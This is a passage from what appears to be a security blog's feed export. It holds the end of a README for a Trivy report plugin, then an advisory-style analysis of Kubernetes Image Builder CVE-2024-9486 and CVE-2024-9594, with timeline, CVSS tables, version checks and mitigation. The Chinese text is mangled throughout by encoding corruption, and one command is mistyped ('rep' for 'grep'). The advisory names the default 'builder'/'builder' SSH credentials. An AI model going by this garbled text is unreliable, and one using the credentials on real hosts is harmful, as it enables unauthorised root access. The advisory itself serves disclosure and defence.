¼å¼çš„æŠ¥å‘Šï¼Œä½†è¿™äº›æŠ¥å‘Šæ›´é€‚åˆæŠ€æœ¯äººå‘˜ä½¿ç”¨ã€‚</p><p>åœ¨ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸éœ€è¦å°†å®‰å…¨é£é™©ä»¥æ›´æ˜“äºç†è§£çš„æ–¹å¼å‘ˆç°ç»™éæŠ€æœ¯äººå‘˜ï¼Œ<br>è¿™æ—¶å€™ EXCEL æ–‡ä»¶å°±æ˜¾å¾—å°¤ä¸ºé‡è¦ã€‚</p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜éœ€å†™ä¸€ä»½ç»¼åˆæ€§çš„æ‰«ææŠ¥å‘Šï¼Œè¯¥æŠ¥å‘Šå°†æ¦‚è¿°åˆ¶å“ä¿¡æ¯ã€é•œåƒé…ç½®ã€æ¼æ´æ¦‚è§ˆä»¥åŠè¯¦ç»†çš„æ¼æ´ä¿¡æ¯ã€‚<br>Markdown æ ¼å¼çš„æ–‡æ¡£å› å…¶ä¾¿äºç¼–è¾‘å’ŒæŸ¥é˜…çš„ç‰¹ç‚¹ï¼Œéå¸¸é€‚åˆä½œä¸ºæ­¤ç±»æŠ¥å‘Šçš„è½½ä½“ã€‚</p><h2 id="ğŸŒŸ-ç‰¹æ€§"><a href="#ğŸŒŸ-ç‰¹æ€§" class="headerlink" title="ğŸŒŸ ç‰¹æ€§"></a>ğŸŒŸ ç‰¹æ€§</h2><ul><li><strong>Trivy å…¼å®¹æ€§</strong>ï¼šæ”¯æŒ Trivy ç”Ÿæˆçš„ JSON æ ¼å¼æŠ¥å‘Šï¼›</li><li><strong>åŠå…¬å‹å¥½</strong>ï¼šè½¬æ¢ä¸º EXCEL æ ¼å¼ï¼Œé€‚åˆéæŠ€æœ¯äººå‘˜é˜…è¯»å’Œæ±‡æŠ¥ï¼›</li><li><strong>ä¾¿æ·ç¼–è¾‘å…±äº«</strong>ï¼šMarkdown æ ¼å¼çš„æ‰«ææŠ¥å‘Šï¼Œä¾¿äºå¿«é€Ÿç¼–è¾‘å’Œå…±äº«å…³é”®å®‰å…¨ä¿¡æ¯ã€‚</li></ul><h2 id="ğŸ› ï¸-å®‰è£…æ–¹æ³•"><a href="#ğŸ› ï¸-å®‰è£…æ–¹æ³•" class="headerlink" title="ğŸ› ï¸ å®‰è£…æ–¹æ³•"></a>ğŸ› ï¸ å®‰è£…æ–¹æ³•</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">trivy plugin install github.com/miao2sec/trivy-plugin-report<br></code></pre></td></tr></table></figure><h2 id="ğŸš€-ä½¿ç”¨æ–¹æ³•"><a href="#ğŸš€-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ğŸš€ ä½¿ç”¨æ–¹æ³•"></a>ğŸš€ ä½¿ç”¨æ–¹æ³•</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">trivy image --format json -d --output plugin=report [--output-plugin-arg plugin_flags] &lt;image_name&gt;<br></code></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">trivy image -f json &lt;image_name&gt; | trivy report [plugin_flags]<br></code></pre></td></tr></table></figure><h2 id="ğŸ“-å¸¸è§ç”¨æ³•"><a href="#ğŸ“-å¸¸è§ç”¨æ³•" class="headerlink" title="ğŸ“  å¸¸è§ç”¨æ³•"></a>ğŸ“  å¸¸è§ç”¨æ³•</h2><ol><li><p>ç”Ÿæˆ EXCEL è¡¨æ ¼ï¼Œå¹¶å‘½åä¸º <code>output.xlsx</code>ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image -f json debian:12 | trivy report --excel-file output.xlsx<br></code></pre></td></tr></table></figure><p> <img src="/image/shell-img.png" alt="img.png"><br> <img src="/image/default-excel.png" alt="img.png"><br> è¯¦æƒ…è¯·çœ‹ <a href="https://github.com/miao2sec/trivy-plugin-report/blob/main/excel/testdata/vpt_java_test.xlsx">vpt_java_test.xlsx</a></p></li><li><p>ä½¿ç”¨ <code>--beautify</code> å°† EXCEL è¡¨æ ¼ç¾åŒ–ã€‚å³ï¼Œæ ¹æ®æ¼æ´çš„å¨èƒç­‰çº§å¡«å……èƒŒæ™¯è‰²ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image -f json debian:12 | trivy report --excel-file output-beautify.xlsx --beautify<br></code></pre></td></tr></table></figure><p><img src="/image/beautify-excel.png" alt="img.png"><br>è¯¦æƒ…è¯·çœ‹ <a href="https://github.com/miao2sec/trivy-plugin-report/blob/main/excel/testdata/vpt_java_test_beautify.xlsx">vpt_java_test_beautify.xlsx</a></p></li><li><p>ç”Ÿæˆ Markdown æ–‡æ¡£ï¼Œå¹¶å‘½åä¸º <code>output.md</code></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image -f json sonobuoy/kube-hunter:v0.2.0 | trivy report --markdown-file output.md<br></code></pre></td></tr></table></figure><p><img src="/image/markdown.png" alt="img.png"><br>è¯¦æƒ…è¯·çœ‹ <a href="https://github.com/miao2sec/trivy-plugin-report/blob/main/markdown/testdata/kube-hunter.md">kube-hunter.md</a></p></li><li><p>ä½¿ç”¨ <code>--brief</code> å°† Markdown ç®€åŒ–ã€‚å³ï¼Œå»é™¤æ¼æ´æè¿°å’Œç›¸å…³é“¾æ¥ï¼š</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image -f json tomcat:9.0.97-jre8-temurin-jammy | trivy report --markdown-file output.md --brief<br></code></pre></td></tr></table></figure><p>è¯¦æƒ…è¯·çœ‹ <a href="https://github.com/miao2sec/trivy-plugin-report/blob/main/markdown/testdata/tomcat.md">tomcat.md</a></p></li></ol><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li><input checked="" disabled="" type="checkbox"> ğŸ“ å¯¼å‡º markdown æ–‡æ¡£</li><li><input disabled="" type="checkbox"> ğŸ“ å¯¼å‡º PDF æ–‡æ¡£</li><li><input checked="" disabled="" type="checkbox"> ğŸŒ æ±‰åŒ–æŠ¥å‘Š</li><li><input disabled="" type="checkbox"> ğŸŒ æ·»åŠ é˜¿é‡Œäº‘æ¼æ´æº</li><li><input disabled="" type="checkbox"> ğŸš€ æ·»åŠ  CNNVD æ¼æ´æº</li><li><input disabled="" type="checkbox"> ğŸ›¡ï¸ æ”¯æŒé”™è¯¯é…ç½®ã€è®¸å¯è¯å’Œ secret</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
      <tag>å·¥å…·è‡ªç ”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-9486 å’Œ CVE-2024-9594ï¼šK8S Image Builder æ„å»ºçš„ VM é•œåƒä½¿ç”¨é»˜è®¤å‡­è¯</title>
    <link href="/2024/10/23/CVE-2024-9486-%E5%92%8C-CVE-2024-9594%EF%BC%9AK8S-Image-Builder-%E6%9E%84%E5%BB%BA%E7%9A%84-VM-%E9%95%9C%E5%83%8F%E4%BD%BF%E7%94%A8%E9%BB%98%E8%AE%A4%E5%87%AD%E8%AF%81/"/>
    <url>/2024/10/23/CVE-2024-9486-%E5%92%8C-CVE-2024-9594%EF%BC%9AK8S-Image-Builder-%E6%9E%84%E5%BB%BA%E7%9A%84-VM-%E9%95%9C%E5%83%8F%E4%BD%BF%E7%94%A8%E9%BB%98%E8%AE%A4%E5%87%AD%E8%AF%81/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-æ¦‚è¿°"><a href="#0x00-æ¦‚è¿°" class="headerlink" title="0x00 æ¦‚è¿°"></a>0x00 æ¦‚è¿°</h2><p>æ–‡ç« æ¦‚è¿°äº† Kubernetes çš„ Image Builder é¡¹ç›®ä¸­çš„ä¸¤ä¸ªå®‰å…¨æ¼æ´ CVE-2024-9486 å’Œ CVE-2024-9594ï¼Œæè¿°äº†æ¼æ´å‘ç°ã€ä¿®å¤è¿‡ç¨‹åŠé£é™©è¯„ä¼°ï¼Œæä¾›äº†æ£€æµ‹å’Œç¼“è§£æªæ–½ï¼Œå¹¶åˆ†æäº†æ¼æ´åŸå› ã€‚</p><p>å…¶å®è¿™ä¸¤ä¸ªæ¼æ´éå¸¸ç®€å•ï¼Œå°±æ˜¯å°†å‡­è¯ç¡¬ç¼–ç åœ¨ä»£ç æ–‡ä»¶ä¸­äº†ï¼Œå¹¶ä¸”å½±å“çš„èµ„äº§èŒƒå›´ä¸å¤§ï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰ç½‘ä¸Šè¯´çš„é‚£ä¹ˆä¸¥é‡ã€‚</p><p>è®©æˆ‘ä»¬æ¥çœ‹çœ‹åˆ°åº•æ€ä¹ˆå›äº‹ï½</p><h2 id="0x01-æ—¶é—´çº¿"><a href="#0x01-æ—¶é—´çº¿" class="headerlink" title="0x01 æ—¶é—´çº¿"></a>0x01 æ—¶é—´çº¿</h2><h3 id="2024-å¹´-10-æœˆ-12-æ—¥"><a href="#2024-å¹´-10-æœˆ-12-æ—¥" class="headerlink" title="2024 å¹´ 10 æœˆ 12 æ—¥"></a>2024 å¹´ 10 æœˆ 12 æ—¥</h3><p>Rybnikar Enterprises GmbH çš„ <a href="https://github.com/rybnico">Nicolai Rybnikar</a> å‘ Kubernetes æŠ¥é€äº† CVE-2024-9486 å’Œ CVE-2024-9594 æ¼æ´ï¼Œå¹¶ç”± Red Hat çš„ <a href="https://github.com/joelsmith">Joel Smith</a>æäº¤äº†ä¸¤ä¸ª Issueï¼Œåˆ†åˆ«æ˜¯ï¼š</p><ol><li><a href="https://github.com/kubernetes/kubernetes/issues/128006">CVE-2024-9486</a>ï¼šä½¿ç”¨ Image Builder æ„å»ºçš„ä¸”é•œåƒæä¾›å•†æ˜¯ Proxmox çš„ VM é•œåƒä½¿ç”¨äº†é»˜è®¤çš„ç™»å½•å‡­è¯</li><li><a href="https://github.com/kubernetes/kubernetes/issues/128007">CVE-2024-9594</a>ï¼šä½¿ç”¨ Image Builder æ„å»ºçš„ä¸€äº›æä¾›å•†çš„ VM é•œåƒä½¿ç”¨äº†é»˜è®¤çš„ç™»å½•å‡­è¯ï¼ˆè¿™é‡Œçš„æä¾›å•†æŒ‡çš„æ˜¯ Nutanixã€OVAã€QEMU å’ŒåŸå§‹æä¾›å•†ï¼‰</li></ol><h3 id="2024-å¹´-10-æœˆ-14-æ—¥"><a href="#2024-å¹´-10-æœˆ-14-æ—¥" class="headerlink" title="2024 å¹´ 10 æœˆ 14 æ—¥"></a>2024 å¹´ 10 æœˆ 14 æ—¥</h3><p><a href="https://github.com/kubernetes-sigs/image-builder">Image Builder</a>é¡¹ç›®çš„ <a href="https://github.com/AverageMarcus">Marcus Noble</a>æäº¤äº†ä¸¤ä¸ª PR è¿›è¡Œä¿®å¤ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><ol><li>CVE-2024-9486ï¼š<a href="https://github.com/kubernetes-sigs/image-builder/pull/1595">ç¡®ä¿ Proxmox æä¾›å•†æ¸…ç†äº† builder ç”¨æˆ·</a><br>CVE-2024-9594ï¼š<a href="https://github.com/kubernetes-sigs/image-builder/pull/1596">ä¸º builder ç”¨æˆ·è®¾ç½®éšæœºçš„ ssh å¯†ç </a></li><li>ç”±äº Image Builder é¡¹ç›®æ˜¯ç”± <a href="https://github.com/kubernetes/kubernetes-template-project">kubernetes&#x2F;kubernetes-template-project</a>æ¨¡æ¿ç”Ÿæˆçš„ï¼Œä¸”å½’å±äº <a href="https://github.com/kubernetes-sigs">Kubernetes SIGs</a>ï¼ˆKubernetes SIG ç›¸å…³å·¥ä½œçš„ç»„ç»‡ï¼‰ï¼Œæ‰€ä»¥ Kubernetes åœ¨å½“å¤©å°±å‘å¸ƒäº†ä¸€åˆ™å®‰å…¨å…¬å‘Šï¼š</li></ol><ul><li>CVE-2024-9486 å’Œ CVE-2024-9594ï¼š<a href="https://groups.google.com/g/kubernetes-security-announce/c/UKJG-oZogfA/m/Lu1hcnHmAQAJ">è‹¥ VM èŠ‚ç‚¹çš„ VM é•œåƒæ˜¯ä½¿ç”¨ Kubernetes çš„ Image Builder é¡¹ç›®æ„å»ºçš„ï¼Œé‚£ä¹ˆæœªç»æˆæƒçš„ç”¨æˆ·å¯ä»¥ä½¿ç”¨ ssh ç™»å½•åˆ°è¿™ä¸ªèŠ‚ç‚¹ä¸­ã€‚</a>ã€‚</li></ul><h3 id="2024-å¹´-10-æœˆ-15-æ—¥"><a href="#2024-å¹´-10-æœˆ-15-æ—¥" class="headerlink" title="2024 å¹´ 10 æœˆ 15 æ—¥"></a>2024 å¹´ 10 æœˆ 15 æ—¥</h3><p>NVD å‘å¸ƒäº† <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9486">CVE-2024-9486</a> å’Œ <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9594">CVE-2024-9594</a> çš„æ¼æ´ä¿¡æ¯ã€‚</p><h3 id="2024-å¹´-10-æœˆ-16-æ—¥"><a href="#2024-å¹´-10-æœˆ-16-æ—¥" class="headerlink" title="2024 å¹´ 10 æœˆ 16 æ—¥"></a>2024 å¹´ 10 æœˆ 16 æ—¥</h3><p>NVD å¯¹æ¼æ´ä¿¡æ¯è¿›è¡Œäº†æ›´æ”¹ï¼Œæœ€ç»ˆçš„ä¿¡æ¯ä¸ºï¼š</p><table><thead><tr><th>æ¼æ´ç¼–å·</th><th><strong>CVE-2024-9486</strong></th><th><strong>CVE-2024-9594</strong></th></tr></thead><tbody><tr><td>å¨èƒç­‰çº§</td><td>è¶…å±</td><td>ä¸­å±</td></tr><tr><td>CVSS è¯„åˆ†</td><td>9.8</td><td>6.3</td></tr><tr><td>CVSS å‘é‡</td><td>CVSS:3.1&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:U&#x2F;C:H&#x2F;I:H&#x2F;A:H</td><td>CVSS:3.1&#x2F;AV:A&#x2F;AC:H&#x2F;PR:H&#x2F;UI:R&#x2F;S:U&#x2F;C:H&#x2F;I:H&#x2F;A:H</td></tr><tr><td>CWE ç¼–å·</td><td><a href="http://cwe.mitre.org/data/definitions/798.html">CWE-798</a></td><td></td></tr><tr><td>CWE åç§°</td><td>ä½¿ç”¨ç¡¬ç¼–ç å‡­è¯</td><td></td></tr></tbody></table><p>è¿™ä¸¤ä¸ªæ¼æ´éƒ½ä½¿ç”¨çš„æ˜¯ CVSS ç‰ˆæœ¬ 3.1 çš„è¯„åˆ†ç³»ç»Ÿã€‚</p><p>ä» CVSS å‘é‡æ¥çœ‹ï¼ŒCVE-2024-9486 æ¼æ´æ›´å®¹æ˜“è¢«è¿œç¨‹æ”»å‡»è€…åˆ©ç”¨ï¼Œå› ä¸ºå®ƒä¸éœ€è¦é«˜æƒé™å’Œç”¨æˆ·äº¤äº’ï¼Œè€Œ CVE-2024-9594 æ¼æ´æ›´éš¾ä»¥è¢«åˆ©ç”¨ï¼Œå› ä¸ºå®ƒéœ€è¦æ”»å‡»è€…å…·æœ‰æ›´é«˜çš„æƒé™å’Œå¯èƒ½çš„ç”¨æˆ·äº¤äº’ï¼Œå¹¶ä¸”æ”»å‡»å‘é‡æ›´ä¸ºå—é™ã€‚</p><p>ä¸è¿‡ï¼Œä¸¤è€…åœ¨æœºå¯†æ€§ã€å®Œæ•´æ€§å’Œå¯ç”¨æ€§çš„å½±å“ä¸Šéƒ½æ˜¯é«˜åº¦ä¸¥é‡çš„ã€‚</p><table><thead><tr><th>é¡¹ç›®åç§°</th><th>CVE-2024-9486</th><th>CVE-2024-9594</th></tr></thead><tbody><tr><td><strong>æ”»å‡»å‘é‡</strong> (Attack Vector, ç®€ç§° AV)</td><td>Networkï¼ˆç½‘ç»œï¼‰ï¼Œæ„å‘³ç€æ”»å‡»è€…ä¸éœ€è¦ç‰©ç†è®¿é—®ï¼Œå¯ä»¥é€šè¿‡ç½‘ç»œå‘èµ·æ”»å‡»ã€‚</td><td>Adjacentï¼ˆç›¸é‚»ç½‘ç»œï¼‰ï¼Œæ„å‘³ç€æ”»å‡»è€…éœ€é€šè¿‡æœ¬åœ°ç½‘ç»œæˆ–ä¸ç›®æ ‡ç³»ç»Ÿç›´æ¥ç›¸è¿çš„ç½‘ç»œæ¥å‘èµ·æ”»å‡»ã€‚</td></tr><tr><td><strong>æ”»å‡»å¤æ‚æ€§</strong> (Attack Complexity, ç®€ç§° AC)</td><td>Lowï¼ˆä½ï¼‰ï¼Œè¡¨ç¤ºæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ç›¸å¯¹å®¹æ˜“ã€‚</td><td>Highï¼ˆé«˜ï¼‰ï¼Œè¡¨ç¤ºåˆ©ç”¨è¯¥æ¼æ´ç›¸å¯¹å¤æ‚ï¼Œå¯èƒ½éœ€è¦å¤šä¸ªæ­¥éª¤ã€‚</td></tr><tr><td><strong>æ‰€éœ€æƒé™</strong> (Privileges Required, ç®€ç§° PR)</td><td>Noneï¼ˆæ— éœ€ç‰¹æ®Šæƒé™ï¼‰ï¼Œæ”»å‡»è€…ä¸éœ€è¦ä»»ä½•ç‰¹æ®Šæƒé™å³å¯åˆ©ç”¨æ­¤æ¼æ´ã€‚</td><td>Highï¼ˆé«˜ï¼‰ï¼Œæ”»å‡»è€…éœ€è¦é«˜çº§åˆ«çš„æƒé™æ‰èƒ½åˆ©ç”¨æ­¤æ¼æ´ã€‚</td></tr><tr><td><strong>ç”¨æˆ·äº¤äº’</strong> (User Interaction, ç®€ç§° UI)</td><td>Noneï¼ˆæ— ï¼‰ï¼Œåˆ©ç”¨æ­¤æ¼æ´ä¸éœ€è¦ç”¨æˆ·è¿›è¡Œä»»ä½•æ“ä½œã€‚</td><td>Requiredï¼ˆéœ€è¦ï¼‰ï¼Œæ¼æ´åˆ©ç”¨éœ€è¦ç”¨æˆ·è¿›è¡ŒæŸäº›æ“ä½œã€‚</td></tr><tr><td><strong>å½±å“èŒƒå›´</strong> (Scope, ç®€ç§° S)</td><td>Unchangedï¼ˆä¸å˜ï¼‰ï¼Œè¡¨ç¤ºæ¼æ´åˆ©ç”¨ä¸ä¼šå¯¼è‡´æ”»å‡»è€…åœ¨å—å½±å“çš„ç»„ä»¶ä¹‹å¤–è·å¾—é¢å¤–çš„æƒé™ã€‚</td><td>Unchangedï¼ˆä¸å˜ï¼‰ï¼ŒåŒå·¦ã€‚</td></tr><tr><td><strong>æœºå¯†æ€§å½±å“</strong> (Confidentiality Impact, ç®€ç§° C)</td><td>Highï¼ˆé«˜ï¼‰ï¼Œæ¼æ´å¯èƒ½æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚</td><td>Highï¼ˆé«˜ï¼‰ï¼ŒåŒå·¦ã€‚</td></tr><tr><td><strong>å®Œæ•´æ€§å½±å“</strong> (Integrity Impact, ç®€ç§° I)</td><td>Highï¼ˆé«˜ï¼‰ï¼Œæ¼æ´å¯èƒ½å¯¼è‡´æ•°æ®è¢«ç¯¡æ”¹ã€‚</td><td>Highï¼ˆé«˜ï¼‰ï¼ŒåŒå·¦ã€‚</td></tr><tr><td><strong>å¯ç”¨æ€§å½±å“</strong> (Availability Impact, ç®€ç§° A)</td><td>Highï¼ˆé«˜ï¼‰ï¼Œæ¼æ´å¯èƒ½å¯¼è‡´æœåŠ¡ä¸­æ–­æˆ–æ‹’ç»æœåŠ¡ã€‚</td><td>Highï¼ˆé«˜ï¼‰ï¼ŒåŒå·¦ã€‚</td></tr></tbody></table><p>å½“å¤©ä¸‹åˆ 7:01ï¼Œ<a href="https://feedly.com/cve/CVE-2024-9486">CVE-2024-9486</a> å’Œ <a href="https://feedly.com/cve/CVE-2024-9594">CVE-2024-9594</a>çš„ EPSS åˆ†æ•°çš†ä¸º 0.05%ï¼ˆç™¾åˆ†ä½æ•°ï¼š16.4%ï¼‰</p><h2 id="0x02-é£é™©æ’æŸ¥"><a href="#0x02-é£é™©æ’æŸ¥" class="headerlink" title="0x02 é£é™©æ’æŸ¥"></a>0x02 é£é™©æ’æŸ¥</h2><p>ç”¨æˆ·å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤ä¾æ¬¡æ£€æŸ¥è‡ªå·±æ˜¯å¦å—åˆ°è¯¥æ¼æ´çš„å½±å“ï¼š</p><ol><li>é›†ç¾¤ä½¿ç”¨çš„ VM é•œåƒæ˜¯ Kubernetes çš„ Image Builder â‰¤ v0.1.37 æ„å»ºçš„ã€‚</li><li>ä½¿ç”¨ Proxmox æä¾›å•†æ„å»ºçš„é•œåƒçš„ VM å·²ç»æ˜ç¡®å­˜åœ¨ CVE-2024-9486 æ¼æ´ã€‚è¿™ç§æƒ…å†µä¸‹ï¼ŒVM é•œåƒä¸ä¼šç¦ç”¨é»˜è®¤å‡­è¯ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡é»˜è®¤å‡­è¯è®¿é—®ä½¿ç”¨ç”Ÿæˆé•œåƒçš„èŠ‚ç‚¹ã€‚è¿™äº›å‡­è¯å¯ç”¨äºè·å– root è®¿é—®æƒé™ã€‚</li><li>ä½¿ç”¨ Nutanixã€OVAã€QEMU å’ŒåŸå§‹ï¼ˆrawï¼‰æä¾›å•†æ„å»ºçš„é•œåƒçš„ VM åœ¨æ„å»ºè¿‡ç¨‹ä¸­å­˜åœ¨ CVE-2024-9594 æ¼æ´ã€‚åªæœ‰åœ¨æ”»å‡»è€…èƒ½å¤Ÿè®¿é—®åˆ°æ­£åœ¨æ„å»ºé•œåƒçš„ VMï¼Œå¹¶ä¸”åœ¨æ„å»ºè¿‡ç¨‹ä¸­åˆ©ç”¨è¿™ä¸ªæ¼æ´æ¥ç¯¡æ”¹é•œåƒæ—¶ï¼Œæ‰ä¼šå—åˆ°è¿™ä¸ªæ¼æ´çš„å½±å“ã€‚</li><li>ä½¿ç”¨ç”±å…¶ä»–æä¾›å•†æ„å»ºçš„é•œåƒçš„ VM ä¸å—å½±å“ã€‚</li></ol><p>è‹¥è¦æŸ¥çœ‹æ‰€ä½¿ç”¨çš„ Image Builder çš„ç‰ˆæœ¬ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š</p><ul><li>è‹¥ä½¿ç”¨æºç å®‰è£…çš„ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> &lt;<span class="hljs-built_in">local</span> path to image builder repo&gt;<br>make version<br></code></pre></td></tr></table></figure><ul><li>è‹¥ä½¿ç”¨ tarball å®‰è£…ä¸‹è½½çš„ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> &lt;<span class="hljs-built_in">local</span> path to install location&gt;<br>rep -o v0\\.[0-9.]* RELEASE.md | <span class="hljs-built_in">head</span> -1<br></code></pre></td></tr></table></figure><ul><li>è‹¥é€šè¿‡å®¹å™¨é•œåƒéƒ¨ç½²çš„ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run --<span class="hljs-built_in">rm</span> &lt;image pull spec&gt; version<br></code></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">podman run --<span class="hljs-built_in">rm</span> &lt;image pull spec&gt; version<br></code></pre></td></tr></table></figure><p>æˆ–è€…æ˜¯æŸ¥çœ‹é•œåƒçš„ TAGã€‚å¦‚æœæ˜¯å®˜æ–¹é•œåƒ <code>registry.k8s.io/scl-image-builder/cluster-node-image-builder-amd64:v0.1.37</code>ï¼Œé‚£ä¹ˆ Image Builder çš„ç‰ˆæœ¬å°±æ˜¯ v0.1.37ã€‚</p><h2 id="0x03-ç¼“è§£æªæ–½"><a href="#0x03-ç¼“è§£æªæ–½" class="headerlink" title="0x03 ç¼“è§£æªæ–½"></a>0x03 ç¼“è§£æªæ–½</h2><p>ä½¿ç”¨çš„ â‰¥ v0.1.38ï¼ˆå·²ä¿®å¤ï¼‰ç‰ˆæœ¬çš„ Image Builder é‡æ„å—å½±å“çš„é•œåƒï¼Œå†å°†å·²ä¿®å¤åçš„é•œåƒé‡æ–°éƒ¨ç½²åˆ°æ‰€æœ‰å—å½±å“çš„ VM ä¸­ã€‚</p><p>è‹¥æ— æ³•è¿›è¡Œå‡çº§ï¼Œå¯ä»¥é€šè¿‡ç¦ç”¨å—å½±å“çš„ VM ä¸Šçš„ <code>builder</code> è´¦æˆ·æ¥ç¼“è§£æ­¤æ¼æ´ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">usermod -L builder<br></code></pre></td></tr></table></figure><h2 id="0x04-æ£€æµ‹æ–¹æ³•"><a href="#0x04-æ£€æµ‹æ–¹æ³•" class="headerlink" title="0x04 æ£€æµ‹æ–¹æ³•"></a>0x04 æ£€æµ‹æ–¹æ³•</h2><p>ä½¿ç”¨ linux å‘½ä»¤ <code>last builder</code> æ¥æŸ¥çœ‹å—å½±å“çš„ <code>builder</code> è´¦æˆ·çš„ç™»å½•ä¿¡æ¯ã€‚</p><h2 id="0x05-æ¼æ´åˆ†æ"><a href="#0x05-æ¼æ´åˆ†æ" class="headerlink" title="0x05 æ¼æ´åˆ†æ"></a>0x05 æ¼æ´åˆ†æ</h2><p>Image Builder çš„ v0.1.37ï¼ˆå­˜åœ¨æ¼æ´ï¼‰ç‰ˆæœ¬åœ¨ä½¿ç”¨ Proxmoxã€Nutanixã€OVAã€QEMU å’ŒåŸå§‹ï¼ˆrawï¼‰æä¾›å•†æ‰€æä¾›çš„é•œåƒæ¥æ„å»ºé•œåƒæ—¶ï¼Œå°† <code>ssh_username</code> å’Œ <code>ssh_password</code> çš„å€¼ï¼ˆçš†ä¸º <code>builder</code>ï¼‰ç¡¬ç¼–ç åœ¨ä»£ç æ–‡ä»¶ä¸­ï¼Œå› æ­¤æœªç»æˆæƒçš„ç”¨æˆ·å¯ä»¥ä½¿ç”¨é»˜è®¤ç”¨æˆ· <code>builder</code> æ¥è¿œç¨‹ç™»å½•åˆ°å—å½±å“çš„èŠ‚ç‚¹ä¸­ã€‚</p><p>Image Builder åœ¨ v0.1.38ï¼ˆå·²ä¿®å¤ï¼‰çš„ç‰ˆæœ¬ä¸­ï¼Œå°†é»˜è®¤ç”¨æˆ· <code>builder</code> çš„å¯†ç è®¾ç½®ä¸ºéšæœºå€¼ï¼Œå³å˜é‡ <code>&#123;&#123;uuid&#125;&#125;</code>ã€‚</p><p><img src="/image/640.webp" alt="å›¾ 1ï¼šåœ¨æ„å»ºé•œåƒçš„æ—¶å€™ï¼Œè®¾ç½®éšæœºç”Ÿæˆçš„å¯†ç ã€‚" title="å›¾1ï¼šåœ¨æ„å»ºé•œåƒçš„æ—¶å€™ï¼Œè®¾ç½®éšæœºç”Ÿæˆçš„å¯†ç ã€‚"></p><p>æ­¤å¤–ï¼Œåœ¨ Proxmox æä¾›å•†æä¾›çš„é•œåƒæ„å»ºç»“æŸè¿‡åï¼Œè¿˜ç¦ç”¨äº† <code>builder</code> ç”¨æˆ·ã€‚ä¸‹é¢çš„è¿™æ®µ SHELL è„šæœ¬çš„æ„æ€æ˜¯ï¼šä½¿ç”¨æ‰€æä¾›çš„ç”¨æˆ·å <code>ssh_username</code> å’Œå¯†ç  <code>ssh_password</code> é”æ‰è¯¥ç”¨æˆ·ï¼Œç„¶åå…³é—­ç³»ç»Ÿæ–­å¼€è¿æ¥ã€‚</p><p><img src="/image/641.webp" alt="å›¾ 2ï¼šProxmox çš„æ„å»ºç»“æŸè¿‡åï¼Œç¦ç”¨ builder è´¦æˆ·" title="å›¾2ï¼šProxmoxçš„æ„å»ºç»“æŸè¿‡åï¼Œç¦ç”¨builderè´¦æˆ·"></p><h2 id="0x06-å‚è€ƒé“¾æ¥"><a href="#0x06-å‚è€ƒé“¾æ¥" class="headerlink" title="0x06 å‚è€ƒé“¾æ¥"></a>0x06 å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://thehackernews.com/2024/10/critical-kubernetes-image-builder.html">https://thehackernews.com/2024/10/critical-kubernetes-image-builder.html</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>CVE æ¼æ´åˆ†æ</tag>
      
      <tag>Kubernetes å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>â€œAI ç–²åŠ³â€äº†ï¼Ÿè®©æˆ‘ä»¬æ¥çœ‹çœ‹çœŸæ­£çš„ AI å®‰å…¨è¦ç‚¹</title>
    <link href="/2024/10/18/%E2%80%9CAI%E7%96%B2%E5%8A%B3%E2%80%9D%E4%BA%86%EF%BC%9F%E8%AE%A9%E6%88%91%E4%BB%AC%E6%9D%A5%E7%9C%8B%E7%9C%8B%E7%9C%9F%E6%AD%A3%E7%9A%84AI-%E5%AE%89%E5%85%A8%E8%A6%81%E7%82%B9/"/>
